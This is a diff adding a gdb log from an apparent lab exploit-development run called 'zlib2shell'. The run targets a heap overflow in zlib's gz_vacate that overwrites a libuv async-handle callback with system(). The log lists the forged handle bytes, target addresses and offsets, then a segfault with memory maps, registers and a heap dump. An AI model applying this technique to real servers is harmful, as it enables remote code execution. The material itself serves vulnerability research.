@@ -1,0 +1,81 @@
+Breakpoint 1 at 0x404bed: file gzwrite.c, line 394.
+Breakpoint 2 at 0x404c10: file gzwrite.c, line 395.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+PORT=38989
+SYSTEM_ADDR=0x7ffff7c58750
+ASYNC_ADDR=0x46ae30
+LOOP_ADDR=0x7ffff7fa7180
+HANDLE_SIZE=128
+ASYNC_CB_OFF=96
+HANDLE_HEX=00000000000000008071faf7ff7f0000010000000000000000000000000000009071faf7ff7f00005072faf7ff7f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000c00000000000000a6154000000000003073faf7ff7f00009872faf7ff7f00000000000000000000
+REQ_BYTES=359400
+WRITTEN=65535
+
+Breakpoint 1, gz_vacate (state=0x4232d0) at gzwrite.c:394
+394	    memmove(state->in, strm->next_in, strm->avail_in);
+
+Breakpoint 2, gz_vacate (state=0x4232d0) at gzwrite.c:395
+395	    strm->next_in = state->in;
+PRINTF_RC=-5
+UV_SENT=1
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7f9679f in ?? () from /lib/x86_64-linux-gnu/libuv.so.1
+process 2184433
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset  Perms  objfile
+            0x400000           0x401000     0x1000        0x0  r--p   /tmp/zlib2shell-uv-vuln/srv
+            0x401000           0x415000    0x14000     0x1000  r-xp   /tmp/zlib2shell-uv-vuln/srv
+            0x415000           0x420000     0xb000    0x15000  r--p   /tmp/zlib2shell-uv-vuln/srv
+            0x420000           0x421000     0x1000    0x1f000  r--p   /tmp/zlib2shell-uv-vuln/srv
+            0x421000           0x422000     0x1000    0x20000  rw-p   /tmp/zlib2shell-uv-vuln/srv
+            0x422000           0x46b000    0x49000        0x0  rw-p   [heap]
+      0x7ffff7c00000     0x7ffff7c28000    0x28000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
+      0x7ffff7c28000     0x7ffff7db1000   0x189000    0x28000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6
+      0x7ffff7db1000     0x7ffff7e00000    0x4f000   0x1b1000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
+      0x7ffff7e00000     0x7ffff7e04000     0x4000   0x1ff000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
+      0x7ffff7e04000     0x7ffff7e06000     0x2000   0x203000  rw-p   /usr/lib/x86_64-linux-gnu/libc.so.6
+      0x7ffff7e06000     0x7ffff7e13000     0xd000        0x0  rw-p   
+      0x7ffff7f18000     0x7ffff7f73000    0x5b000        0x0  rw-p   
+      0x7ffff7f73000     0x7ffff7f7b000     0x8000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libuv.so.1.0.0
+      0x7ffff7f7b000     0x7ffff7f9d000    0x22000     0x8000  r-xp   /usr/lib/x86_64-linux-gnu/libuv.so.1.0.0
+      0x7ffff7f9d000     0x7ffff7fa6000     0x9000    0x2a000  r--p   /usr/lib/x86_64-linux-gnu/libuv.so.1.0.0
+      0x7ffff7fa6000     0x7ffff7fa7000     0x1000    0x32000  r--p   /usr/lib/x86_64-linux-gnu/libuv.so.1.0.0
+      0x7ffff7fa7000     0x7ffff7fa8000     0x1000    0x33000  rw-p   /usr/lib/x86_64-linux-gnu/libuv.so.1.0.0
+      0x7ffff7fb4000     0x7ffff7fb8000     0x4000 0x10000000  rw-s   anon_inode:[io_uring]
+      0x7ffff7fb8000     0x7ffff7fbb000     0x3000        0x0  rw-s   anon_inode:[io_uring]
+      0x7ffff7fbb000     0x7ffff7fbc000     0x1000 0x10000000  rw-s   anon_inode:[io_uring]
+      0x7ffff7fbc000     0x7ffff7fbd000     0x1000        0x0  rw-s   anon_inode:[io_uring]
+      0x7ffff7fbd000     0x7ffff7fbf000     0x2000        0x0  rw-p   
+      0x7ffff7fbf000     0x7ffff7fc3000     0x4000        0x0  r--p   [vvar]
+      0x7ffff7fc3000     0x7ffff7fc5000     0x2000        0x0  r-xp   [vdso]
+      0x7ffff7fc5000     0x7ffff7fc6000     0x1000        0x0  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7fc6000     0x7ffff7ff1000    0x2b000     0x1000  r-xp   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x2c000  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x36000  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x38000  rw-p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
+rsi            0x46ac78            4631672
+rdi            0x7fffffffa4f0      140737488332016
+rax            0x5eaded98cf5f6d32  6822370251106118962
+rcx            0xfaaf3950          4205787472
+No symbol matches $pc.
+#0  0x00007ffff7f9679f in ?? () from /lib/x86_64-linux-gnu/libuv.so.1
+#1  0x00007ffff7f9b966 in ?? () from /lib/x86_64-linux-gnu/libuv.so.1
+#2  0x00007ffff7f82ce8 in uv_run () from /lib/x86_64-linux-gnu/libuv.so.1
+#3  0x0000000000401b3e in main () at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/zlib2shell/harness/uv_server.c:119
+0x46ac18:	0x6be4be2d78d44342	0x3f1a2ff3218c5ff0
+0x46ac28:	0x59b914377dda98d9	0x5bc0c767be297a37
+0x46ac38:	0x019c569c48cf8f9b	0x1cd126e2a6eb9131
+0x46ac48:	0x71112cfb7b5dfe8f	0x81a066cdc0dc1744
+0x46ac58:	0x5979bd1b48736892	0x375d2f96526b4ce2
+0x46ac68:	0xc59fb9e5d62c6a22	0xc619df6cb93ff2b5
+0x46ac78:	0x58d1109b03cd3b56	0x5eaded98cf5f6d32
+0x46ac88:	0x7edde290efbaf2f1	0xbee88f11faaf3950
+0x46ac98:	0xcf3239e89e86ee5a	0x3105141d6520fc53
+0x46aca8:	0x8f42174d01e0702a	0x63828f2f9f22f5bd
+0x46acb8:	0xa04133238fe00a05	0x3f84cc6ec8edb2d0
+0x46acc8:	0xe681eae621b115f0	0x103f9a8fa78d91be
